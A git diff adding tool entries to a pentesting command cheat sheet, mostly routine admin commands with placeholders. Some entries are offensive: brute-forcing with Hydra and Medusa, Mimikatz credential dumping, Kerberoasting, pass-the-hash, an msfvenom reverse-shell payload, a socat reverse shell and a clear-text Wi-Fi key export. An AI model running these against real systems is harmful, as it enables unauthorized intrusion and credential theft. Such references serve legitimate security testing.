@@ -15,6 +15,136 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Netcat](#netcat)
   - [SearchSploit](#searchsploit)
   - [TCPDump](#tcpdump)
+  - [GMSAPasswordReader](#gmsapasswordreader)
+  - [GetSPN](#getspn)
+  - [PowerUp](#powerup)
+  - [Powerview](#powerview)
+  - [PrivescCheck](#privesccheck)
+  - [SharpGPOAbuse](#sharpgpoabuse)
+  - [Accesschk](#accesschk)
+  - [Apt](#apt)
+  - [Arp](#arp)
+  - [Awk](#awk)
+  - [Bc](#bc)
+  - [Bettercap](#bettercap)
+  - [BloodHound](#bloodhound)
+  - [Cadaver](#cadaver)
+  - [Cat](#cat)
+  - [Certutil](#certutil)
+  - [Cewl](#cewl)
+  - [Chisel](#chisel)
+  - [Cmd](#cmd)
+  - [Comm](#comm)
+  - [Crackmapexec](#crackmapexec)
+  - [Crowbar](#crowbar)
+  - [Crunch](#crunch)
+  - [Curl](#curl)
+  - [Cut](#cut)
+  - [Debugfs](#debugfs)
+  - [Diff](#diff)
+  - [Dig](#dig)
+  - [Dir](#dir)
+  - [Dirb](#dirb)
+  - [Dnsrecon](#dnsrecon)
+  - [Docker](#docker)
+  - [Empsave.dat](#empsavedat)
+  - [Evil-winrm](#evil-winrm)
+  - [Exiftool](#exiftool)
+  - [Ffuf](#ffuf)
+  - [Find](#find)
+  - [Findstr](#findstr)
+  - [Foremost](#foremost)
+  - [Gcc](#gcc)
+  - [Git](#git)
+  - [Gobuster](#gobuster)
+  - [Gpg](#gpg)
+  - [Hashcat](#hashcat)
+  - [Host](#host)
+  - [Httptunnel](#httptunnel)
+  - [Hydra](#hydra)
+  - [Icacls](#icacls)
+  - [Iconv](#iconv)
+  - [Impacket](#impacket)
+  - [Ip](#ip)
+  - [Iptables](#iptables)
+  - [John](#john)
+  - [Kerberoast](#kerberoast)
+  - [Ln](#ln)
+  - [Ls](#ls)
+  - [Mailman.com_ips.txt](#mailmancom_ipstxt)
+  - [Man](#man)
+  - [Masscan](#masscan)
+  - [Medusa](#medusa)
+  - [Metasploit](#metasploit)
+  - [Mimikatz](#mimikatz)
+  - [Mingw-64](#mingw-64)
+  - [Mklink](#mklink)
+  - [Mosquitto_sub](#mosquitto_sub)
+  - [Mount](#mount)
+  - [Msfvenom](#msfvenom)
+  - [Mysql](#mysql)
+  - [Nbt scan](#nbt-scan)
+  - [Nc](#nc)
+  - [Nessus](#nessus)
+  - [Net](#net)
+  - [Netsh](#netsh)
+  - [Netstat](#netstat)
+  - [Nmap](#nmap)
+  - [Nslookup](#nslookup)
+  - [Onesixtyone](#onesixtyone)
+  - [Openssl](#openssl)
+  - [Passwd](#passwd)
+  - [Phpggc](#phpggc)
+  - [Plink](#plink)
+  - [Powercat](#powercat)
+  - [Powershell](#powershell)
+  - [Psexec](#psexec)
+  - [Pth-winexe](#pth-winexe)
+  - [Python](#python)
+  - [Recon-ng](#recon-ng)
+  - [Redis](#redis)
+  - [Reg](#reg)
+  - [Responder](#responder)
+  - [Rinetd](#rinetd)
+  - [Rlwrap](#rlwrap)
+  - [Rpcclient](#rpcclient)
+  - [Rsmangler](#rsmangler)
+  - [Runas](#runas)
+  - [Sc](#sc)
+  - [Schtasks](#schtasks)
+  - [Scp](#scp)
+  - [Sed](#sed)
+  - [SendEmail](#sendemail)
+  - [Sharphound](#sharphound)
+  - [Shellter](#shellter)
+  - [Simple-server](#simple-server)
+  - [Smbclient](#smbclient)
+  - [Snmpwalk](#snmpwalk)
+  - [Socat](#socat)
+  - [Spose](#spose)
+  - [Sqlmap](#sqlmap)
+  - [Sqsh](#sqsh)
+  - [Ssh](#ssh)
+  - [Steghide](#steghide)
+  - [Svn](#svn)
+  - [Tail](#tail)
+  - [Tar](#tar)
+  - [Tasklist](#tasklist)
+  - [Tcpdump](#tcpdump)
+  - [Terminal](#terminal)
+  - [Theharverster](#theharverster)
+  - [Tr](#tr)
+  - [Ufw](#ufw)
+  - [Uname](#uname)
+  - [Watch](#watch)
+  - [Wc](#wc)
+  - [Webservers](#webservers)
+  - [Wfuzz](#wfuzz)
+  - [Whois](#whois)
+  - [Wpscan](#wpscan)
+  - [Xfreerdp](#xfreerdp)
+  - [Xxd](#xxd)
+  - [Ysosoerial](#ysosoerial)
 - [Payloads](#payloads)
   - [XSS Payloads](#xss-payloads)
   - [XML Payloads](#xml-payloads)
@@ -683,7 +813,921 @@ cd cheatsheet-pentesting
   ```bash
   git status
   ```
+### GPG
+- **Encrypt a File**:
+  ```bash
+  gpg -c <file>
+  ```
 
+- **Decrypt a File**:
+  ```bash
+  gpg <file>.gpg
+  ```
+
+- **Generate a GPG Key Pair**:
+  ```bash
+  gpg --gen-key
+  ```
+
+### Hashcat
+- **Start Hashcat with a Wordlist**:
+  ```bash
+  hashcat -m <hash_type> <hash_file> <wordlist>
+  ```
+
+- **Show Supported Hash Types**:
+  ```bash
+  hashcat --help | grep Hash
+  ```
+
+- **Resume a Session**:
+  ```bash
+  hashcat --session <session_name> --restore
+  ```
+
+### Host
+- **Lookup an IP Address for a Hostname**:
+  ```bash
+  host <hostname>
+  ```
+
+- **Reverse Lookup an IP**:
+  ```bash
+  host <IP_address>
+  ```
+
+### HTTPTunnel
+- **Create an HTTP Tunnel Client**:
+  ```bash
+  httptunnel -c <client_port> <server_host>:<server_port>
+  ```
+
+- **Start an HTTP Tunnel Server**:
+  ```bash
+  httptunnel -s <server_port>
+  ```
+
+### Hydra
+- **Brute Force SSH Login**:
+  ```bash
+  hydra -l <username> -P <password_list> ssh://<target_ip>
+  ```
+
+- **Brute Force HTTP Basic Authentication**:
+  ```bash
+  hydra -L <user_list> -P <password_list> http-get://<target_ip>
+  ```
+
+### ICACLS
+- **Display File Permissions**:
+  ```cmd
+  icacls <file>
+  ```
+
+- **Grant Permissions**:
+  ```cmd
+  icacls <file> /grant <user>:(<permissions>)
+  ```
+
+- **Remove All Permissions**:
+  ```cmd
+  icacls <file> /remove <user>
+  ```
+
+### Iconv
+- **Convert File Encoding**:
+  ```bash
+  iconv -f <source_encoding> -t <target_encoding> <input_file> -o <output_file>
+  ```
+
+- **Check Supported Encodings**:
+  ```bash
+  iconv --list
+  ```
+
+### Impacket
+- **Run SMB Server**:
+  ```bash
+  impacket-smbserver <share_name> <share_path>
+  ```
+
+- **Execute Remote Command**:
+  ```bash
+  impacket-psexec <target_ip> -u <username> -p <password> <command>
+  ```
+
+### IP
+- **Show IP Address of Interfaces**:
+  ```bash
+  ip addr
+  ```
+
+- **Add a New IP Address**:
+  ```bash
+  ip addr add <IP_address>/<CIDR> dev <interface>
+  ```
+
+- **Delete an IP Address**:
+  ```bash
+  ip addr del <IP_address>/<CIDR> dev <interface>
+  ```
+
+### IPTables
+- **List Rules**:
+  ```bash
+  iptables -L
+  ```
+
+- **Add a Rule to Accept Traffic on a Port**:
+  ```bash
+  iptables -A INPUT -p tcp --dport <port> -j ACCEPT
+  ```
+
+- **Block an IP Address**:
+  ```bash
+  iptables -A INPUT -s <IP_address> -j DROP
+  ```
+
+### John
+- **Run John the Ripper on a Password File**:
+  ```bash
+  john <password_file>
+  ```
+
+- **Show Cracked Passwords**:
+  ```bash
+  john --show <password_file>
+  ```
+
+### Kerberoast
+- **Request a Service Ticket**:
+  ```bash
+  GetUserSPNs.py -request -dc-ip <domain_controller_ip> <domain>/<username>
+  ```
+
+- **Extract Service Tickets**:
+  ```bash
+  python kerberoast.py -t <ticket_file>
+  ```
+
+### LN
+- **Create a Symbolic Link**:
+  ```bash
+  ln -s <target_file> <link_name>
+  ```
+
+- **Create a Hard Link**:
+  ```bash
+  ln <target_file> <link_name>
+  ```
+
+### LS
+- **List Files in a Directory**:
+  ```bash
+  ls
+  ```
+
+- **Show Detailed Information**:
+  ```bash
+  ls -l
+  ```
+
+- **Show Hidden Files**:
+  ```bash
+  ls -a
+  ```
+
+### Mailman.com_ips.txt
+- **Read IPs from a File and Ping Them**:
+  ```bash
+  while read ip; do ping -c 1 $ip; done < mailman.com_ips.txt
+  ```
+
+### Man
+- **View Manual Page of a Command**:
+  ```bash
+  man <command>
+  ```
+
+- **Search for a Keyword in Manuals**:
+  ```bash
+  man -k <keyword>
+  ```
+
+### Masscan
+- **Scan an IP Range for Open Ports**:
+  ```bash
+  masscan <IP_range> -p<ports>
+  ```
+
+- **Set Maximum Rate**:
+  ```bash
+  masscan <IP_range> -p<ports> --rate=<rate>
+  ```
+
+### Medusa
+- **Brute Force Login for FTP**:
+  ```bash
+  medusa -h <host> -u <username> -P <password_list> -M ftp
+  ```
+
+- **Set Number of Parallel Connections**:
+  ```bash
+  medusa -h <host> -u <username> -P <password_list> -M ftp -t <threads>
+  ```
+
+### Mimikatz
+- **Dump User Credentials**:
+  ```cmd
+  mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+  ```
+
+- **Export Credentials to a File**:
+  ```cmd
+  mimikatz "privilege::debug" "sekurlsa::logonpasswords" > credentials.txt
+  
+### MinGW-64
+- **Compile a C Program**:
+  ```bash
+  x86_64-w64-mingw32-gcc <source_file>.c -o <output_file>.exe
+  ```
+
+- **Compile with Debug Symbols**:
+  ```bash
+  x86_64-w64-mingw32-gcc -g <source_file>.c -o <output_file>.exe
+  ```
+
+### Mklink
+- **Create a Symbolic Link**:
+  ```cmd
+  mklink <link_name> <target_path>
+  ```
+
+- **Create a Hard Link**:
+  ```cmd
+  mklink /H <link_name> <target_path>
+  ```
+
+- **Create a Directory Junction**:
+  ```cmd
+  mklink /J <junction_name> <target_path>
+  ```
+
+### Mosquitto_sub
+- **Subscribe to a Topic**:
+  ```bash
+  mosquitto_sub -h <broker_address> -t <topic>
+  ```
+
+- **Subscribe with Authentication**:
+  ```bash
+  mosquitto_sub -h <broker_address> -u <username> -P <password> -t <topic>
+  ```
+
+### Mount
+- **Mount a Filesystem**:
+  ```bash
+  mount <device> <mount_point>
+  ```
+
+- **Unmount a Filesystem**:
+  ```bash
+  umount <mount_point>
+  ```
+
+- **List Mounted Filesystems**:
+  ```bash
+  mount
+  ```
+
+### Msfvenom
+- **Generate a Reverse Shell Payload**:
+  ```bash
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe > payload.exe
+  ```
+
+- **List Available Payloads**:
+  ```bash
+  msfvenom -l payloads
+  ```
+
+### MySQL
+- **Log in to MySQL**:
+  ```bash
+  mysql -u <username> -p
+  ```
+
+- **Execute an SQL Script**:
+  ```bash
+  mysql -u <username> -p <database> < script.sql
+  ```
+
+- **Show Databases**:
+  ```sql
+  SHOW DATABASES;
+  ```
+
+### NBTScan
+- **Scan a Network for NetBIOS Names**:
+  ```bash
+  nbtscan <IP_range>
+  ```
+
+- **Scan with Verbose Output**:
+  ```bash
+  nbtscan -v <IP_range>
+  ```
+
+### Nessus
+- **Start Nessus Service**:
+  ```bash
+  systemctl start nessusd
+  ```
+
+- **Check Nessus Status**:
+  ```bash
+  systemctl status nessusd
+  ```
+
+### Net
+- **List Shared Resources**:
+  ```cmd
+  net share
+  ```
+
+- **Stop a Service**:
+  ```cmd
+  net stop <service_name>
+  ```
+
+### Netsh
+- **Show Wireless Profiles**:
+  ```cmd
+  netsh wlan show profiles
+  ```
+
+- **Export a Wireless Profile**:
+  ```cmd
+  netsh wlan export profile name="<profile_name>" key=clear folder=<output_folder>
+  ```
+
+### Netstat
+- **Show All Connections**:
+  ```bash
+  netstat -a
+  ```
+
+- **Show Listening Ports**:
+  ```bash
+  netstat -l
+  ```
+
+- **Show Connections by Process**:
+  ```bash
+  netstat -p
+  ```
+
+### Nslookup
+- **Query an IP Address**:
+  ```bash
+  nslookup <hostname>
+  ```
+
+- **Set a Different DNS Server**:
+  ```bash
+  nslookup <hostname> <DNS_server>
+  ```
+
+### OneSixtyOne
+- **Scan SNMP Devices**:
+  ```bash
+  onesixtyone -c <community_string_list> <IP_range>
+  ```
+
+- **Use a Specific Community String**:
+  ```bash
+  onesixtyone -s <community_string> <IP_range>
+  ```
+
+### OpenSSL
+- **Generate a Private Key**:
+  ```bash
+  openssl genpkey -algorithm RSA -out private.key
+  ```
+
+- **Create a Self-Signed Certificate**:
+  ```bash
+  openssl req -x509 -new -key private.key -out cert.pem -days 365
+  ```
+
+### Passwd
+- **Change Your Password**:
+  ```bash
+  passwd
+  ```
+
+- **Change Password for Another User**:
+  ```bash
+  sudo passwd <username>
+  ```
+
+### PHPGGC
+- **Generate a PHP Gadget Chain**:
+  ```bash
+  phpggc <gadget> -o <output_file>
+  ```
+
+- **List Available Gadget Chains**:
+  ```bash
+  phpggc -l
+  ```
+
+### Plink
+- **Initiate an SSH Connection**:
+  ```bash
+  plink -ssh <username>@<host>
+  ```
+
+- **Execute a Command on a Remote Host**:
+  ```bash
+  plink -ssh <username>@<host> <command>
+  
+### Powercat
+- **Start a Listener**:
+  ```powershell
+  powercat -l -p <port> -t <protocol>
+  ```
+
+- **Send a File**:
+  ```powershell
+  powercat -c <host> -p <port> -i <file>
+  ```
+
+### PowerShell
+- **Run a Script**:
+  ```powershell
+  powershell -File <script.ps1>
+  ```
+
+- **Execute a Command**:
+  ```powershell
+  powershell -Command "<command>"
+  ```
+
+### PsExec
+- **Execute a Command on a Remote Host**:
+  ```cmd
+  psexec \\<host> -u <username> -p <password> <command>
+  ```
+
+- **Run Interactive Shell**:
+  ```cmd
+  psexec \\<host>
+  ```
+
+### PTH-Winexe
+- **Run a Command with Pass-the-Hash**:
+  ```bash
+  pth-winexe -U <domain>/<username>%<hash> //<target_ip> <command>
+  ```
+
+### Python
+- **Run a Python Script**:
+  ```bash
+  python <script.py>
+  ```
+
+- **Start Python Interactive Shell**:
+  ```bash
+  python
+  ```
+
+### Recon-ng
+- **Start Recon-ng Framework**:
+  ```bash
+  recon-ng
+  ```
+
+- **Load a Module**:
+  ```bash
+  use <module>
+  ```
+
+### Redis
+- **Connect to Redis CLI**:
+  ```bash
+  redis-cli
+  ```
+
+- **Flush All Data**:
+  ```bash
+  redis-cli FLUSHALL
+  ```
+
+### Reg
+- **Query a Registry Key**:
+  ```cmd
+  reg query <key_path>
+  ```
+
+- **Add a Registry Key**:
+  ```cmd
+  reg add <key_path> /v <value_name> /t <type> /d <data>
+  ```
+
+### Responder
+- **Start Responder**:
+  ```bash
+  responder -I <interface>
+  ```
+
+- **Run in Analysis Mode**:
+  ```bash
+  responder -I <interface> -A
+  ```
+
+### Rinetd
+- **Add Port Forwarding Rule**:
+  ```bash
+  echo "<bind_ip> <bind_port> <target_ip> <target_port>" >> /etc/rinetd.conf
+  ```
+
+- **Restart Rinetd**:
+  ```bash
+  systemctl restart rinetd
+  ```
+
+### Rlwrap
+- **Wrap a Command with Readline**:
+  ```bash
+  rlwrap <command>
+  ```
+
+- **Specify History File**:
+  ```bash
+  rlwrap -H <history_file> <command>
+  ```
+
+### Rpcclient
+- **Connect to an SMB Server**:
+  ```bash
+  rpcclient -U <username> <target_ip>
+  ```
+
+- **Enumerate Users**:
+  ```bash
+  enumdomusers
+  ```
+
+### RSMangler
+- **Generate Wordlists**:
+  ```bash
+  rsmangler --file <input_file> -o <output_file>
+  ```
+
+- **Use Custom Rules**:
+  ```bash
+  rsmangler --file <input_file> --rules
+  ```
+
+### Runas
+- **Run a Program as Another User**:
+  ```cmd
+  runas /user:<username> "<command>"
+  ```
+
+- **Use Password Prompt**:
+  ```cmd
+  runas /user:<username> /savecred "<command>"
+  ```
+
+### SC
+- **Query Service Status**:
+  ```cmd
+  sc query <service_name>
+  ```
+
+- **Start a Service**:
+  ```cmd
+  sc start <service_name>
+  ```
+
+### Schtasks
+- **Create a Scheduled Task**:
+  ```cmd
+  schtasks /create /tn <task_name> /tr <command> /sc <schedule> /st <start_time>
+  ```
+
+- **Delete a Scheduled Task**:
+  ```cmd
+  schtasks /delete /tn <task_name>
+  ```
+
+### SCP
+- **Copy a File to a Remote Server**:
+  ```bash
+  scp <file> <username>@<host>:<remote_path>
+  ```
+
+- **Copy a File from a Remote Server**:
+  ```bash
+  scp <username>@<host>:<remote_file> <local_path>
+  ```
+
+### Sed
+- **Replace Text in a File**:
+  ```bash
+  sed -i 's/<old_text>/<new_text>/g' <file>
+  ```
+
+- **Print Specific Lines**:
+  ```bash
+  sed -n '<line_number>p' <file>
+  
+### SendEmail
+- **Send an Email**:
+  ```bash
+  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -xu <username> -xp <password>
+  ```
+
+- **Attach a File**:
+  ```bash
+  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -a <file_path>
+  ```
+
+### SharpHound
+- **Collect Data for BloodHound**:
+  ```cmd
+  SharpHound.exe -c All
+  ```
+
+- **Compress Output Files**:
+  ```cmd
+  SharpHound.exe -c All --zip
+  ```
+
+### Shellter
+- **Run Shellter in Automatic Mode**:
+  ```bash
+  shellter -a
+  ```
+
+- **Specify Input and Output Files**:
+  ```bash
+  shellter -a -f <input_exe> -o <output_exe>
+  ```
+
+### Simple-Server
+- **Start an HTTP Server**:
+  ```bash
+  python -m http.server <port>
+  ```
+
+### Smbclient
+- **Connect to an SMB Share**:
+  ```bash
+  smbclient //<server>/<share>
+  ```
+
+- **Download a File**:
+  ```bash
+  get <file_name>
+  ```
+
+### Snmpwalk
+- **Query an SNMP Device**:
+  ```bash
+  snmpwalk -v <version> -c <community_string> <IP_address>
+  ```
+
+- **Specify an OID**:
+  ```bash
+  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
+  ```
+
+### Socat
+- **Create a Reverse Shell**:
+  ```bash
+  socat TCP:<target_host>:<port> EXEC:/bin/bash
+  ```
+
+- **Forward a Port**:
+  ```bash
+  socat TCP-LISTEN:<local_port>,fork TCP:<target_host>:<target_port>
+  ```
+
+### Spose
+- **Find File Paths**:
+  ```bash
+  spose <file_name>
+  ```
+
+### Sqlmap
+- **Scan a URL for SQL Injection**:
+  ```bash
+  sqlmap -u <url>
+  ```
+
+- **Specify a POST Request**:
+  ```bash
+  sqlmap -u <url> --data="<POST_data>"
+  ```
+
+### Sqsh
+- **Start a Session**:
+  ```bash
+  sqsh -S <server> -U <username> -P <password>
+  ```
+
+### SSH
+- **Connect to a Server**:
+  ```bash
+  ssh <username>@<host>
+  ```
+
+- **Run a Command Remotely**:
+  ```bash
+  ssh <username>@<host> <command>
+  ```
+
+### Steghide
+- **Embed Data in a File**:
+  ```bash
+  steghide embed -cf <cover_file> -ef <embed_file>
+  ```
+
+- **Extract Data from a File**:
+  ```bash
+  steghide extract -sf <stego_file>
+  ```
+
+### SVN
+- **Check Out a Repository**:
+  ```bash
+  svn checkout <repo_url>
+  ```
+
+- **Commit Changes**:
+  ```bash
+  svn commit -m "<message>"
+  ```
+
+### Tail
+- **View the End of a File**:
+  ```bash
+  tail <file>
+  ```
+
+- **Follow File Changes**:
+  ```bash
+  tail -f <file>
+  ```
+
+### Tar
+- **Create a Tar Archive**:
+  ```bash
+  tar -cvf <archive.tar> <files>
+  ```
+
+- **Extract a Tar Archive**:
+  ```bash
+  tar -xvf <archive.tar>
+  ```
+
+### Tasklist
+- **List All Processes**:
+  ```cmd
+  tasklist
+  ```
+
+- **Filter by Name**:
+  ```cmd
+  tasklist /FI "IMAGENAME eq <process_name>"
+  ```
+
+### Terminal
+- **Open a New Terminal Tab**:
+  ```bash
+  gnome-terminal --tab
+  ```
+
+### TheHarvester
+- **Gather Information about a Domain**:
+  ```bash
+  theharvester -d <domain> -l 500 -b google
+  ```
+
+### Tr
+- **Translate Characters**:
+  ```bash
+  echo <string> | tr <set1> <set2>
+  ```
+
+- **Delete Characters**:
+  ```bash
+  echo <string> | tr -d <chars>
+  ```
+
+### UFW
+- **Allow a Port**:
+  ```bash
+  ufw allow <port>
+  ```
+
+- **Check UFW Status**:
+  ```bash
+  ufw status
+  ```
+
+### Uname
+- **Print System Information**:
+  ```bash
+  uname -a
+  ```
+
+- **Print Kernel Name**:
+  ```bash
+  uname -s
+  ```
+
+### Watch
+- **Run a Command Repeatedly**:
+  ```bash
+  watch <command>
+  ```
+
+- **Highlight Changes**:
+  ```bash
+  watch -d <command>
+  ```
+
+### WC
+- **Count Lines in a File**:
+  ```bash
+  wc -l <file>
+  ```
+
+- **Count Words in a File**:
+  ```bash
+  wc -w <file>
+  ```
+
+### Webservers
+- **Start a Simple Python Web Server**:
+  ```bash
+  python -m http.server <port>
+  ```
+
+### WFuzz
+- **Fuzz a URL**:
+  ```bash
+  wfuzz -c -z file,<wordlist> --hc 404 <url>/FUZZ
+  ```
+
+- **Fuzz POST Data**:
+  ```bash
+  wfuzz -c -z file,<wordlist> -d "param=FUZZ" <url>
+  ```
+
+### Whois
+- **Query Domain Information**:
+  ```bash
+  whois <domain>
+  ```
+
+### Wpscan
+- **Scan a WordPress Site**:
+  ```bash
+  wpscan --url <site_url>
+  ```
+
+- **Enumerate Plugins**:
+  ```bash
+  wpscan --url <site_url> --enumerate p
+  ```
+
+### Xfreerdp
+- **Connect to an RDP Server**:
+  ```bash
+  xfreerdp /u:<username> /p:<password> /v:<host>
+  ```
+
+### Xxd
+- **Create a Hex Dump**:
+  ```bash
+  xxd <file>
+  ```
+
+- **Revert a Hex Dump to Binary**:
+  ```bash
+  xxd -r <hex_file>
+  ```
+
+### Ysoserial
+- **Generate a Payload**:
+  ```bash
+  java -jar ysoserial.jar <payload_type> "<command>"
+  
 
 
 ---
